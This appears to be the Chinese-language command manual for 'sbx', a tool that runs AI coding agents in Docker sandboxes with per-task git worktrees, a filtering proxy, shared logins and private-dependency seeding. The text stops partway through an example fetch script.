# sbx 命令手册

> 按"你会在什么时候用到它"递进排列：装一次 → 日常回路 → 会话控制 → 观察 → 网络 → 维护，最后是参数、配置和环境变量的速查。
> 不想要 worktree、想让改动直接落在仓库目录里，看[「我想直接在仓库目录里干活」](#我想直接在仓库目录里干活main-task)。
> 还不知道 sbx 是什么、为什么这么设计，先看[项目主页](https://zzjha-cn.github.io/agent_sandbox/)；想看一个连续场景从头到尾发生了什么，去 [walkthrough.md](walkthrough.md)；想看组件怎么拼的，去 [architecture.md](architecture.md)。
> 本文描述 M1 + 部分 M2 的**实际代码行为**（`core/internal/cli/`），不是计划。

## 先有的三个概念

| 概念 | 是什么 | 从哪来 |
|---|---|---|
| **Workspace** | 一个 git 仓库。id = `<目录名>-<仓库根路径 sha1 前 6 位>`，例如 `shop-e76272` | `cd` 到仓库里任意位置自动识别 |
| **Task** | Workspace 下的一条工作线。一个 Task = 一个容器 + 一个 worktree + 一个分支 `sbx/<task>` | `sbx run <task>` |
| **main Task** | 省略 task 名时的特例：**直接用仓库根**，不建 worktree，没有专属分支 | `sbx run` |

**几乎所有命令都要在仓库目录里执行**（要靠 cwd 推断 Workspace）。只有 `sbx upgrade` 例外，它只读全局配置。

一句话记住路径：**Task 的改动在它自己的 worktree 里（`~/.sbx/worktrees/<ws>/<task>`），不在你的仓库目录里**，合并分支之后才回到仓库。想让改动直接落在仓库目录里，见[「我想直接在仓库目录里干活」](#我想直接在仓库目录里干活main-task)。

---

## 第 1 层：装一次

```bash
cd core && make build                       # 得到 bin/sbx
ln -sf "$PWD/bin/sbx" /usr/local/bin/sbx    # 可选，放进 PATH
```

需要 Docker Desktop 已启动，内存建议 10GB。

每位互不信任的用户使用独占 Docker daemon；rootless daemon 或独立 VM 可承载该边界。升级后若已有 `sbx-home/cache/mise` 但尚无归属记录，先查看并显式接管：

```sh
sbx isolation status --json   # 只读；未接管旧卷时退出 3
sbx isolation adopt           # 声明这是当前用户独占的 daemon，保留旧卷和登录态
sbx isolation status --json
```

空 daemon 首次操作自动登记归属。`admit` 不创建归属记录；错误 owner、跨 namespace 的 Task 和显式 `shared-daemon` 部署均被拒绝。daemon、旧卷与新对象的 namespace/owner、全局配置、回滚和恢复步骤见 [R6 隔离设计与验收](r6-isolation.md)。本轮开发环境已完成接管，现有 Codex 登录继续可用。

需要宿主机代理时写 `~/.sbx/config.toml`（全部字段见下文「配置：四层」一节）：

```toml
[network]
upstream = "http://host.docker.internal:7890"
```

**登录一次，所有 Task 共享。**

```bash
sbx login            # 打开 claude 的登录流程：照它给的链接授权，把授权码粘回来
sbx login --status   # 看看现在是哪个账号
```

临时选择执行 provider 无需修改配置：`sbx run --agent codex codex-demo`，或 `sbx run --agent claude claude-demo`。`--agent` 覆盖本次的 `default_agent`，不写配置文件；恢复时仍检查 Task 原有 provider，不能用它切换已有 Task 的身份归属。协议模式 `--envelope` 保持从配置选择 provider，不接受此运行覆盖参数。

命令形式是 `sbx login [claude|codex]`，**省略时就是 claude**。Codex 支持设备码登录，或者显式导入本机已有认证：

```sh
sbx login codex --import ~/.codex              # 从目录读取 auth.json
sbx login codex --import /path/to/auth.json    # 也可直接指定文件
sbx login codex --import ~/.codex --force      # 明确替换已有 Codex 凭据
sbx login codex --status
```

导入只处理 `auth.json`，不会复制 config、sessions、skills 等其他内容。文件通过 stdin 传入无网络的临时容器，在私有暂存目录中用 Codex 检查可识别性，再原子安装到 `sbx-home/.codex/auth.json`，权限为 `0600`。默认保护已有凭据，`--force` 才替换；Claude 的身份保持不变。导入不需要在浏览器再次授权，也不会发起模型请求。

源文件不被修改。导入是一次独立拷贝，后续刷新不与宿主机双向同步。若宿主机认证保存在系统钥匙串而没有 `auth.json`，命令会给出说明；不会自动读取钥匙串或改写本机 Codex 配置。可按 [Codex 官方说明](https://developers.openai.com/codex/auth) 配置文件凭据存储后再导入。`--import` 仅支持 Codex，不能与 `--status`、`--logout` 混用。

它在一个临时容器里挂上 `sbx-home` 跑 `claude auth login`，凭据落在这个 volume 里。**这个容器没有 Task，也就不接 Task 网络和 `sbx-proxy`**：配了 `network.upstream` 就走上游代理，否则直连。第一次 `sbx run` 发现没凭据时会停下来让你先跑这条。

`sbx done` 不会删 `sbx-home`（只删 `sbx.kind=dep` 的 Task 私有 volume）。OAuth token 过期后再跑一次 `sbx login`，写的是同一个 volume，所有 Task 立刻跟着生效。

| 参数 | 做什么 |
|---|---|
| `--status` | 只打印登录态，不登录 |
| `--logout` | 退出登录，清掉 `sbx-home` 里的凭据 |
| `--force` | 已经登录时也重新走一遍（换账号） |
| `--console` | 用 Anthropic Console 账号（按量计费）而不是 Claude 订阅 |
| `--email <addr>` | 预填登录页上的邮箱 |

`--console` 和 `--email` 是 claude 特有的，透传给 `claude auth login`。和 `sbx upgrade` 一样，**这条命令不需要在 git 仓库里执行**。

---

## 第 2 层：日常回路

四条命令就是一个完整的生命周期：

```bash
cd ~/code/shop
sbx run fix-login         # ① 开工：建 worktree + 分支 sbx/fix-login，起容器，进 claude
                          #    离开：Ctrl-b 松手再按 d
sbx ls                    # ② 看看它干得怎么样
sbx done fix-login        # ③ 收工：删容器/网络/dep volume/worktree/state，保留分支
git merge sbx/fix-login   # ④ 在主仓库里合并（sbx 不会自动合并）
git branch -D sbx/fix-login
```

### `sbx run [task]`

一条命令干三件事，**按容器是否存在自动分支**：

| 情况 | 行为 |
|---|---|
| 容器不存在 | 新建：worktree → 镜像 → 网络 → 接入 proxy → volume → 容器 → 起 claude。任何一步失败都会逆序清理（worktree 保留） |
| 容器存在但停了 | `docker start`，再确认 claude 在跑 |
| 容器在跑、claude 也在 | 什么都不做，直接 attach |
| 容器在跑、claude 退了（Ctrl-D / `/exit`） | **在原 tmux 会话里重新拉起**，默认带 `--continue` 接上上次对话 |

所以 `sbx run <同一个名字>` 是幂等的恢复命令，手滑退出 claude 之后再跑一次就回来了。

| 参数 | 说明 |
|---|---|
| `--base <ref>` | 新建分支的起点，默认当前 HEAD。Task 已存在时忽略并提示 |
| `-d, --detach` | 只启动不进入，适合批量铺任务 |
| `--fresh` | 重新拉起时开一段新对话（默认接上这个 Task 的上次对话） |
| `--net open\|allowlist` | 只影响本次，不写配置 |
| `--proxy shared\|dedicated` | 只影响本次，不写配置；Task 建好之后换不了（见下文） |
| `-p, --prompt <text>` | headless：跑完这段 prompt 就结束，不进会话（`-p -` 从 stdin 读） |

`--base` 用在从某个历史提交或另一分支起步：`sbx run hotfix --base v1.2.0`。分支已存在时，`ls` 里的 AHEAD/DIFF 基准自动取它和 HEAD 的分叉点（merge-base）。

### 无人值守：`sbx run -p` 和 `sbx logs`（M3-7）

```bash
sbx run nightly -p "把 CI 里失败的那几个测试修好，每修一个提交一次"
sbx run nightly -p - < prompt.md        # 长 prompt 从文件来
sbx run nightly -p "..." --detach       # 不等它，回头 sbx logs -f 看
sbx logs nightly                        # 看完整输出
sbx logs nightly -f -n 50               # 跟着看，先打最后 50 行
```

`-p` 和交互模式的区别只有两点：**不进 tmux**，以及**跑完容器自己停掉**。

- 前台跑时 sbx 跟着 `run.log` 打印直到结束，并用 claude 的退出码退出——所以 `sbx run t -p "..." && git merge sbx/t` 这种写法是成立的。
- **跑完容器会停**：整夜铺十个任务时，跑完一个就释放一份内存和一个 `max_running` 名额。想进去看现场就 `sbx run <task>` 把它起回来，worktree、分支、`run.log` 都还在。
- `sbx ls` 显示 `exited(0)`（或非 0 的码）。注意这是 **claude 的**退出码，不是容器的。
- 输出在 `~/.sbx/state/<ws>/<task>/run.log`，追加写，每轮前面有一行时间分隔头，超过 10MB 轮转成 `run.log.1`。`sbx logs` 读的就是这个文件，**所以容器停了照样看得到**。
- 默认接上这个 Task 的上次对话（和交互模式一样），`--fresh` 才新开一段。连续 `-p` 可以一轮一轮往下推。
- 它仍然跑在 tmux 里，所以**跑的过程中可以 `sbx attach` 进去围观**。
- 一个 Task 里已经有会话在跑时，`-p` 会被**直接拒绝**，不会插队——两个 claude 抢同一棵 worktree 只会互相踩。

### `sbx done <task>...`

可以一次给多个名字。**不会自动合并，分支一定保留**，结束后打印合并和删分支的命令。

两道防线：

- **未提交的改动** → 直接报错，让你先去提交；`--force` 才丢弃。
- **已提交未合并** → 分支和 commit 都在 `.git` 里，删 worktree 不影响。

删的是：容器、Task 网络、proxy 上的这个用户（dedicated 模式下是整个 sidecar 容器）、`sbx.kind=dep` 的依赖 volume、worktree、state 目录。**不删**：分支、`sbx-home`、`sbx-cache`、镜像。最后一个 shared Task 结束时顺带停掉 `sbx-proxy`。

同时会提醒一次项目记忆（见 `sbx memory pull`）——趁容器还在的时候读，所以提醒发生在删之前。

---

## 我想直接在仓库目录里干活（main Task）

默认的 `sbx run <task>` 会新开分支 `sbx/<task>` 和一个独立 worktree，改动**不在你的仓库目录里**。想让 Agent 直接改你 `cd` 进去的那个目录、宿主机 `git status` 立刻看得见 —— **省略 task 名**：

```bash
cd ~/code/shop
git switch -c try-refactor   # 建议先自己开一个分支（见下面的代价 ③）
sbx run                      # main Task：直接用仓库根
```

没有 `--no-worktree` 之类的开关，`main` 就是这个用法的全部入口。

| | `sbx run fix-login` | **`sbx run`（main）** |
|---|---|---|
| 工作目录 | `~/.sbx/worktrees/<ws>/fix-login` | **你的仓库根**（bind mount 进容器） |
| 分支 | 新建 `sbx/fix-login` | **不建，用你当前 checkout 的那个分支** |
| `--base` | 生效 | 忽略并提示 |
| `ls` 里的样子 | `sbx/fix-login` + AHEAD / DIFF | `(repo root)`，AHEAD / DIFF 都是 `-` |
| `done` 时 | 删 worktree | **仓库根一个字节不动**，只拆容器 |

### 代价

1. **你和 Agent 在同一棵工作树上。** 它 `git checkout`、`git stash`、改文件，你编辑器里那份跟着变。并行干活基本不可能 —— worktree 方案要解决的正是这个。
2. **一个 Workspace 只有一个 main。** 要同时跑两条线就必须用命名 Task。
3. **它直接提交到你当前分支。** 没有 `sbx/<task>` 这层隔离，不满意只能自己 reset，所以进去之前先开个分支。

> 容器里仍然会用 dep volume 遮住 `node_modules`（`deps.mask`），Agent 装的依赖不会污染你宿主机的那份 —— 这一条在 main 下也成立。

### 其实你未必需要它

worktree 就是宿主机上的真实目录，不是容器内部的东西：

```bash
code "$(sbx path fix-login)"    # 编辑器直接打开，和普通项目没区别
cd "$(sbx path fix-login)"      # git diff / git log 都正常
sbx ls                          # 不进目录也能看 AHEAD / DIFF
```

**怎么选**：要边看边改、随时介入一条线 → `sbx run`（main）。要并行铺几个任务、或者想保留"不满意就扔掉整个分支"的退路 → 命名 Task + `sbx path`。后者是 sbx 的主场景。

---

## 第 3 层：进出会话

```bash
sbx attach fix-login      # 回到 Agent 的 tmux 会话
sbx shell fix-login       # 在同一个容器里另开一个 bash（不打扰 Agent）
sbx stop fix-login        # 停容器和它的伴生服务/forwarder，保留一切；sbx run 可恢复
```

三个都要求容器在运行，否则提示你去 `sbx run`。

**离开会话是 `Ctrl-b` 松手再按 `d`**（tmux detach），Agent 继续跑。`Ctrl-D` 是退出 claude 本身 —— 退出后 tmux 会话仍然活着（里面变成一个 shell，`ls` 显示 `exited(agent)`），`sbx run` 可以把它重新拉起来，所以手滑了不丢东西。

`attach` 到一个 claude 已退出的 Task 时会先提示你这件事，再把你放进那个 shell。

**`stop` 和 `done` 的区别**：`stop` 只是关机，容器、worktree、对话全在；`done` 是拆除。中途不干了用 `stop`，干完了用 `done`。

---

## 第 4 层：观察

```bash
sbx ls
sbx path fix-login
code "$(sbx path fix-login)"
cd "$(sbx path fix-login)"
```

`sbx ls` 列出当前 Workspace 的 Task（有容器的 + 有 state 目录的并集）：

| 列 | 含义 |
|---|---|
| `TASK` | Task 名 |
| `STATUS` | 见下表 |
| `BRANCH` | `sbx/<task>`，main Task 显示 `(repo root)` |
| `AHEAD` | 相对 base 的提交数。**`0` 意味着 Agent 还没提交过任何东西** |
| `DIFF` | `3f +10 -2` = 3 个文件、+10 行、-2 行（相对 base 的三点 diff） |
| `DENIED` | 这个 Task 被代理拦掉的请求数（只数"不在白名单"那一类）。`-` 表示这次没统计到（代理没在跑） |
| `LINKS` | 挂着的伴生容器：`svc:1 fwd:2`。**`fwd` 非 0 的分支是接过真实内部服务跑出来的**，事后 review 该用不一样的尺度看 |
| `LAST-ACTIVE` | hooks 最后一次写状态的时间 |
| `PATH` | worktree 路径（`~` 缩写） |

```bash
sbx ls --all          # 列出所有 Workspace 的 Task，多一列 WORKSPACE；不要求你在某个仓库里
sbx ls --no-denied    # 跳过 DENIED 列（它要读一次代理的 access.log）
```

STATUS 由容器状态和 claude hooks 写的 `status.json` 共同推导：

| 状态 | 含义 |
|---|---|
| `absent` | 没有容器（只剩 state） |
| `stopped` | 容器已停（含 `docker stop` 的 SIGTERM/SIGKILL） |
| `exited(<code>)` / `exited(oom)` | 容器异常退出；`oom` 说明内存不够，调 `resources.memory` |
| `starting` | 容器在跑，但还没收到第一个 hook |
| `running` | Agent 正在干活（`UserPromptSubmit` / `PreToolUse`） |
| `idle` | Agent 停下了：可能干完了，**也可能在等你回话**（`Notification`） |
| `exited(0)` | headless 跑完了（`sbx run -p`），这是 claude 的退出码 |
| `exited(agent)` | 容器还在，claude 退了，会话里是 shell。`sbx run` 可重新拉起 |

> **`idle` 是最需要你亲自看一眼的状态。** 它不区分"任务完成"和"Agent 在问你要不要继续"。配合 `AHEAD 0` 基本可以断定它停在要人确认上 —— attach 进去看最后一句话。

更细的时间线在 `~/.sbx/state/<ws>/<task>/events.log`，每行带日期和时区。

---

## 第 5 层：网络

**默认不拦截**（`network.mode = "open"`，2026-10-08 起）。两种模式都走 Squid（默认是共用的 `sbx-proxy`），所以日志一直有，云端 MCP 的策略拦截在两种模式下都生效。

```bash
sbx net denied                 # Agent 被代理拦了什么
sbx net denied fix-login       # 只看一个 Task
sbx net denied --since 2h      # 只看最近两小时
sbx net denied --all           # 连策略拦截、遥测、认证失败一起显示
sbx net allow repo.mongodb.org # 放行域名，写进 ~/.sbx/config.toml 并热加载
sbx run t1 --net allowlist     # 本次用白名单模式
sbx run t1 --proxy dedicated   # 本次用独占的代理 sidecar
```

`net denied` 默认只显示**"不在白名单"**这一类 —— 也就是真正可能挡住 Agent 干活的。另外两类折叠成一行计数（`--all` 展开）：

| 分类 | 说明 | 要不要管 |
|---|---|---|
| 不在白名单 | allowlist 模式下没放行的域名 | 要。看着像依赖源就 `net allow` |
| 策略拦截/遥测 | `mcp-proxy.anthropic.com`（ADR 0015）、datadog/statsig/sentry | 不用。拦掉是故意的，不影响干活 |
| 认证失败 | 代理鉴权没过 | 异常，说明 Task 的凭据或 proxy 片段有问题 |

`net allow` 会**直接改 TOML 文本而不是重新序列化**，所以你手写的注释和排版都保留；重复执行不动文件。改完立刻对当前 Workspace 里所有运行中的 Task 下发新名单并 `squid -k reconfigure`，不用重启容器。当前是 open 模式时它会提醒你"本来就不拦"。

内置白名单（`core/assets/allowlist/`，allowlist 模式下自动生效，不用你写）：`builtin.txt`（anthropic / claude.ai / openai）、`<profile>.txt`（web-go：npm、pypi、goproxy 等）。你在配置里写的 `network.allow` 是**追加**。域名以 `.` 开头表示连子域一起放行（Squid `dstdomain` 语义）。

> **选哪个模式**：默认 open 换来的是 Agent 能 web search、能装任意依赖，代价是 design §8.2 的"数据外传"缓解在默认配置下不生效。要跑不信任的代码或在意外传，就 `--net allowlist`。理由和放弃了什么，记在 ADR 0005 的 2026-10-08 修订里。

### 共用一个代理，还是一个 Task 一个（M2-7、design §6.2）

默认所有 Task 共用 `sbx-proxy`，靠代理认证区分谁是谁。`network.proxy = "dedicated"`（或 `sbx run <task> --proxy dedicated`）改成每个 Task 一个 sidecar：

|  | shared（默认） | dedicated |
|---|---|---|
| squid 实例 | 全局一个 `sbx-proxy` | `sbx-<ws>-<task>-proxy`，跟着 Task 生死 |
| 代理地址 | `http://<ws>.<task>:<token>@proxy:3128` | `http://proxy:3128`（没有认证） |
| 配置位置 | `~/.sbx/proxy/`，一个 Task 一个片段 | `~/.sbx/state/<ws>/<task>/proxy/`，整份独立 |
| 日志 | 共用 access.log，按用户名拆 | 自己一份，`net denied` 读法一样 |
| 多占的内存 | 一共 128m | **每个 Task 128m** |
| 什么时候用 | 日常 | 要排查代理本身、或者不想和别的 Task 共担故障（R8） |

不做认证是因为用不上：这个 sidecar 只接在这一个 Task 的 internal 网络上，除了它没人连得到。

**模式是建容器时定的**，记在 `state/<ws>/<task>/meta.json` 里。之后改配置不会把一个已经在跑的 Task 搬到另一种代理上——要换就 `sbx done` 之后重新 `run`。`sbx stop` 在 dedicated 下停掉这个 Task 自己的 sidecar，shared 下还是等最后一个 Task 停了才停 `sbx-proxy`。

`network.upstream` 两种模式都生效，但 shared 下只有一个上游（来自个人全局配置）。要给某个 Task 配不一样的上游，用 dedicated。

---

## 第 6 层：维护

```bash
sbx doctor            # 一次体检：docker、代理、登录、信任、通知、首次启动状态
sbx clean             # 回收磁盘：旧镜像 + 派生缓存（见下）
sbx port t1 3000      # 把容器里的端口拿到 127.0.0.1 上
sbx drop t1           # 结束 Task 并删掉分支（要确认）
sbx memory pull       # 把沙箱里新记的项目记忆导回宿主机
sbx memory pull -y    # 不询问直接写
sbx upgrade           # 升级沙箱里的 claude
sbx login --status    # 现在登录的是哪个账号（详见第 1 层）
sbx config show       # 生效配置 + 每个值来自哪一层
sbx trust             # 确认这个仓库的 .sbx/ 内容（见下）
```

**记忆是单向自动的**：每次 `sbx run` 把宿主机这个仓库的记忆（`~/.claude/projects/<key>/memory/`）导入沙箱；沙箱里新记的**不会自动回来**，要 `memory pull`（ADR 0016）。它先按文件列出差异（`add` / `update` / `merge` / `conflict` / `keep`），确认后才写；两边都改过的标 `conflict`，不自动合，留给你手处理。`sbx done` 时会提醒一次。

**`sbx upgrade`** 在 Profile 镜像里 `npm view` 查最新版，重建 Agent 层，把版本号记在 `~/.sbx/claude-version`。容器里的 claude 不会自动更新，**已有 Task 仍用旧镜像**，`done` 之后重新 `run` 才换上。配置里固定了 `agents.claude.version` 时它会拒绝执行，让你改配置。这是唯一不需要在 git 仓库里执行的命令。

---

## 宿主机的哪些东西会进沙箱

容器里的 `~/.claude` 是 volume `sbx-home`，**和你宿主机的 `~/.claude` 是两套**。只有这张表上的内容会被带进去：

| 宿主机 | 进去的方式 |
|---|---|
| `~/.claude/CLAUDE.md` | 每次 `run` 快照复制到 `/sbx/gen/host-claude/`，软链到容器的 `~/.claude/CLAUDE.md` |
| `~/.claude/skills/` `agents/` `commands/` | 只读挂载到 `/sbx/host-claude/<name>`，软链进容器的 `~/.claude/` |
| `~/.claude/projects/<key>/memory/` | 每次 `run` 导入；回来要 `sbx memory pull`（ADR 0016） |
| git `user.name` / `user.email` | 读仓库配置，注入成 `GIT_AUTHOR_*` / `GIT_COMMITTER_*` |
| 时区 | 读 `/etc/localtime`，注入 `TZ` |
| 仓库的 `.git` | bind 挂载，**可写**；但 `.git/hooks` 和 `.git/config` 以**只读**盖在它上面（M4-1） |

`.git` 必须可写：沙箱里的提交能直接出现在你宿主机的 `git log sbx/<task>` 里、不需要任何同步，靠的就是这个。但"写一下就能在宿主机上执行代码"的那两个口子——埋一个 `pre-commit`，或者把 `core.hooksPath` 指到 agent 控得住的地方——是只读的，submodule（含嵌套）一并处理。身份走 `GIT_AUTHOR_*` 环境变量，所以 `git commit` 不受影响。想退回没有防护的行为写 `git.protect = false`；它是**安全开关**，项目层开关都不许设。

**不会进去的**：`~/.claude/settings.json`、`~/.claude/scripts/`、`plugins/`、MCP 配置、各种 API key。沙箱的 claude 配置是另外两层：

- `sbx-home` 里的 `~/.claude/settings.json`——preseed 建的（`theme`、`skipDangerousModePermissionPrompt`），**持久且所有 Task 共享**，你在容器里手改的东西留在这里；
- `/sbx/gen/settings.sbx.json`——每次 `run` 重新渲染，用 `--settings` 注入，放 hooks、`disableClaudeAiConnectors` 和状态栏。

**状态栏**是 sbx 内置的，不依赖你宿主机那份：脚本打包在 sbx 二进制里，渲染到 `/sbx/gen/statusline.sh`，显示 Task 名、模型、分支、未提交文件数和上下文占用条。要换成自己的，改 `core/assets/agent-layer/statusline.sh` 后 `make build`，下次 `run` 生效，**不用重建镜像**。

---

## 参数速查

### 全局

| 参数 | 说明 |
|---|---|
| `-v, --verbose` | 打印执行的每一条 docker 和 git 命令，外加本次生效配置。排查问题第一个加它 |

### 按命令

| 命令 | 参数 | 默认 |
|---|---|---|
| `run [task]` | `--base <ref>` | 当前 HEAD |
| | `-d, --detach` | false |
| | `--fresh` | false（接上次对话） |
| | `--net open\|allowlist` | 跟随配置 |
| | `--proxy shared\|dedicated` | 跟随配置 |
| | `--cloud-mcp` | false（云端 MCP 被拦；只能开不能关） |
| | `-p, --prompt <text>` | 空（交互模式）；`-` 读 stdin |
| `logs <task>` | `-f, --follow` | false |
| | `-n, --tail <行数>` | 0（全部），`-f` 时默认 20 |
| `ls` | `--all` | false（只看当前仓库） |
| | `--no-denied` | false |
| `drop <task>` | `--force` / `-y, --yes` | false |
| `port <task> [port]` | `--rm` | false（省略 port 时收回全部） |
| `doctor` | `--quick` | false（跳过慢的冒烟检查） |
| | `--strict` | false（警告也算失败） |
| `done <task>...` | `--force` | false（脏就报错） |
| `net denied [task]` | `--all` | false（只看"不在白名单"） |
| | `--since <dur>` | 0（全部），例如 `2h`、`30m` |
| `net allow <host>...` | `--project` | false（写个人全局；加上则写 `<repo>/.sbx/sandbox.toml`） |
| `memory pull` | `-y, --yes` | false（先问） |
| `login [claude\|codex]` | `--status` / `--logout` / `--force`；Codex 可用 `--import <目录或文件>` | false |
| | `--console`（claude） | false（Claude 订阅） |
| | `--email <addr>`（claude） | 空 |
| `trust` | `--show` | false（展示并询问；加上则只看不写） |
| | `-y, --yes` | false（先问） |
| `config show` | 无 | |
| `config init` | `--lang <en\|zh>` | `en`（模板注释的语言） |
| | `--force` | false（已存在就报错） |
| | `--print` | false（只打印，不写文件） |
| `forward init` | 同 `config init` 的三个 | 同上 |
| `prep init` | `--lang <en\|zh>` | `en` |
| | `--force` | false（已存在就报错） |
| `prep build` | `--check` | false（构建并播种；加上则只报告） |
| `prep reseed <task>` | `--yes` | false（要输 Task 名确认） |
| `prep drop` | `--all` | false（保留当前 tag 的镜像） |
| `clean` | `--deep` | false（只收不要网络就能回来的） |
| | `-y, --yes` | false（`--deep` 要确认一次） |
| `attach/shell/stop/ls/path/upgrade/prep show` | 无 | |

---

## 用哪个镜像：Profile 和自定义（M3-1/2/3、design §5.2）

```toml
profile = "web-go"     # 内置：web-go（Go + Node + Python）| py-rust（uv + rustup）
# image = "ghcr.io/me/devbox:2026-10"   # 直接用现成镜像，覆盖 profile
```

优先级：**配置里的 `image` > `<repo>/.sbx/Dockerfile` > `profile`**。

- `<repo>/.sbx/Dockerfile` 存在就直接用它当底，不用写任何配置。它在 `.sbx/` 下，所以**信任确认天然管着它**——别人往里塞东西，你下次 `sbx run` 会看到 diff。
- 底层镜像必须是 **Debian/Ubuntu 系**（Agent 层要用 apt-get 和 useradd）。不是的话 sbx 会明确报错，而不是在构建中途以难懂的方式失败。
- **不需要自带 Node**：claude 是 npm 包，Agent 层发现底层没有 npm 会自己装。
- 装在 `/usr/local/<x>/bin` 里的工具记得软链到 `/usr/local/bin`：tmux 和 `bash -l` 是 login shell，`/etc/profile` 会重置 PATH。

**语言运行时按项目走（mise）**：worktree 里有 `.tool-versions`、`mise.toml`、`.nvmrc`、`.python-version`、`rust-toolchain.toml` 时，`sbx run` 会在容器里跑一次 `mise install`，装到全局共享的 `sbx-mise` volume 里——**第二个用同样版本的 Task 直接复用**（实测 51s → 2.8s）。装不上只警告，不挡住 Task 启动。

**依赖遮盖的默认值跟着 Profile 走**：web-go 是 `node_modules`、`.next`，py-rust 是 `.venv`、`target`。自己写 `deps.mask` 时是**追加**，不是替换。

---

## 私有依赖固化：`sbx prep`（M4-6…M4-9、boundary.md §2）

**要解决的问题**：依赖在公司私有源上，而 Task 容器只有一条经 squid 的 HTTP 出口，到不了内网。给沙箱开内网权限是最贵的做法——凭据要进容器，接触面一下子铺开。

**换个方向**：把「取」挪到宿主机上，Task 只负责用。宿主机上 `docker build` 一次，有完整的内网可达性和凭据；产出的镜像当种子，内容播种进 Task 的 volume。**凭据只在 build 期存在，agent 永远碰不到，Task 容器一行私有网络配置都不需要。**

```
.sbx/prep.Dockerfile ──build（有网有凭据）──> sbx/prep-<ws>:<hash> ──cp──> Task volume
```

### 四步上手

```bash
sbx prep init             # 生成带注释的模板，契约写在注释里（也是给 agent 看的 ground truth）
                          # 注释默认英文；要中文注释加 --lang zh
# 编辑 .sbx/prep.Dockerfile，或者让 agent 照着注释填
sbx prep build --check    # 只构建 + 报告会播种什么，不碰任何 volume
sbx prep build            # 构建；新建的 Task 从它播种
```

`--check` 的报告就是反馈回路，具体到能照着改：

```console
$ sbx prep build --check
seeded:   node_modules 57kB · cache/npm 8kB
declared: allow +1 (gitlab.corp.test) · env +1 (NODE_ENV)
warning:  .next is in deps.mask but /src/.next does not exist in the image
(--check: nothing was seeded)
```

### 播种的契约

写 Dockerfile 的时候只要记住两条——其余的 sbx 自己认：

| 镜像里的位置 | 播到哪儿 |
|---|---|
| `WORKDIR` 下命中 `deps.mask` 的目录（`node_modules`、`.venv`、`target`…） | 这个 Task 对应的依赖 volume |
| `/sbx/cache/*` | 全局共享的 `sbx-cache` |

`/sbx/cache` 和容器里的 `GOMODCACHE` / `npm_config_cache` 指向同一处，所以 Dockerfile 里照常 `go mod download`、`npm ci` 就行，不用改任何环境变量。

**凭据用 BuildKit secret**，不要 `COPY` 也不要 `ARG`——它只在那一条 `RUN` 的挂载期间可见，不落进任何镜像层（`docker history` 里也看不到）：

```dockerfile
RUN --mount=type=secret,id=netrc,target=/root/.netrc \
    go mod download
```

```toml
# <repo>/.sbx/sandbox.toml —— 只有 id，没有值，可以进仓库
[prep]
secrets = ["netrc"]

# ~/.sbx/config.toml —— 值在这里，项目层整段被红线挡住
[prep.secret]
netrc = "~/.sbx/secrets/corp.netrc"
```

### 新鲜度：tag 就是内容哈希

`tag = hash(prep.Dockerfile + watch 列出的文件内容)`。所以**"这个 tag 的镜像不存在"就等于"依赖漂移了或者从没构建过"**，不需要另记一份状态。

解析 Dockerfile 猜不出它 `COPY` 了什么，所以要项目层明说哪些文件算数（相对路径，是事实陈述，红线放行）：

```toml
[prep]
watch = ["go.mod", "go.sum", "package-lock.json"]
on_drift = "warn"   # warn（默认）| build | fail
```

- `warn`（默认）：提醒一句，Task 照常起，依赖 volume 是空的。**默认不自动构建**——自动构建意味着每次 `sbx run` 都可能悄悄连一次内网，边界就糊了。
- `build`：自动构建。它是**安全开关**，只能写在全局层或工作区层，项目层不得设置。
- `fail`：直接报错，适合 CI。

### 只在 volume 新建时播种

`sbx run` 建 Task 时，只往**这次新建的** volume 里播种，不碰已经装好东西的 volume。对运行中的 Task 重新播种会抹掉它自己装的依赖，所以那是一条单独的、必须确认的命令：

```console
$ sbx prep reseed fix-login
this overwrites fix-login's dependency volumes (node_modules, .next) with the contents of sbx/prep-shop-e76272:a1b2c3d4e5f6.
anything the agent installed in them is lost.
Type the task name to confirm (fix-login):
```

它还会拒绝对正在跑的 Task 动手——边写边换 volume 的结果没人能预料。

> **共享缓存是个例外**：`sbx-cache` 是全局的，装过一次 sbx 的人它早就存在了，照"只在新建时播种"的话 go-mod / npm 这类缓存种子对老用户**永远不生效**。缓存又和依赖目录不同——`cp -a` 进子目录是合并不是覆盖，重播不会抹掉谁装的东西。所以它按 tag 变化重播，标记写在 `sbx-cache/.sbx-prep/<ws>`（放 volume 里而不是宿主机 state：volume 删了标记跟着没，不会错判）。

### 看一眼现在是什么状态

```console
$ sbx prep show
dockerfile: .sbx/prep.Dockerfile
watching:   go.mod, go.sum
tag:        sbx/prep-shop-e76272:a1b2c3d4e5f6

TASK       SEED     FROM
fix-login  seeded   a1b2c3d4e5f6
add-search stale    9f8e7d6c5b4a      ← 它是用旧种子建的
main       no seed  -
```

`tag` 后面跟着 `<- not built yet (sbx prep build)` 就说明漂移了。

### 走一遍：Go 服务 + 私有模块

假设 `svc-ranking` 依赖 `gitlab.corp.example/backend/pkg`，公共依赖走公网。两种姿势，差别只在**谁去取**：

| | 姿势一：构建期直连私有源 | 姿势二：宿主机预抓成离线 proxy |
|---|---|---|
| 前提 | 构建容器够得着私有源 | 够不着，或者不想让凭据进 build |
| 凭据 | ssh key / netrc，BuildKit secret 挂一次 | **一份都不要** |
| 仓库外的东西 | 无 | 多一个 fetch 脚本 |

**姿势一**，常态：

```dockerfile
FROM golang:1.25
ENV GOMODCACHE=/sbx/cache/go-mod GOCACHE=/sbx/cache/go-build \
    GOPRIVATE=gitlab.corp.example GOFLAGS=-mod=mod
RUN git config --global url."ssh://git@gitlab.corp.example/".insteadOf "https://gitlab.corp.example/" \
 && mkdir -p -m 0700 /root/.ssh \
 && echo "gitlab.corp.example ssh-ed25519 AAAA..." > /root/.ssh/known_hosts
WORKDIR /src
COPY go.mod go.sum ./
RUN --mount=type=secret,id=gitlab_ssh,target=/root/.ssh/id_rsa,mode=0400 go mod download
```

```toml
# <repo>/.sbx/sandbox.toml —— 跟着仓库走，只有 id 没有值
[prep]
watch   = ["go.mod", "go.sum"]
secrets = ["gitlab_ssh"]

# ~/.sbx/config.toml —— 值在你自己机器上
[prep.secret]
gitlab_ssh = "~/.ssh/id_rsa"
```

`known_hosts` 要**预置**而不是 `ssh-keyscan`：构建期没人回答那句 yes/no，而且首次连接盲信任等于把中间人风险塞进一个你不会去看的地方。

**姿势二**，构建容器连不上私有源时——把「取」再往外挪一层，宿主机抓，prep 只负责 COPY：

```sh
# scripts/prep-fetch.sh：go 的 cache/download 布局本身就是合法的 GOPROXY
go mod download
rsync -a --exclude='*.lock' \
